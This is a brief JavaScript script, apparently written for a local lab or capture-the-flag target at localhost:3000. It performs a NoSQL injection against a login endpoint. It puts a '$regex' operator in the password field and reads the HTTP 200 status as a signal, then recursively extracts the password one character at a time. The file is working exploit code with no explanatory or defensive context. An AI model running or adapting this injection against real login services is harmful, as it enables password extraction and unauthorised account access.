function tryLogin(current, callback) {
    fetch('http://localhost:3000/login', {
        method: 'POST',
        headers: {
            "Content-Type": "application/json",

        },
        body: JSON.stringify(
            {
                "username": "null",
                "password": {
                    "$regex": "^" + current + ".*$"
                }
            }
        )
    }).then(response => {
        if (response.status == 200) {
            console.log(current);
            callback(current);
        }
    });

}

function request(current) {
    for (let i = 48; i <= 122; i++) {
        const c = String.fromCodePoint(i)

        if (['?', '^', '|', '\\'].includes(c)) {
            continue;
        }

        tryLogin(current + c, request)
    }
}

request('');
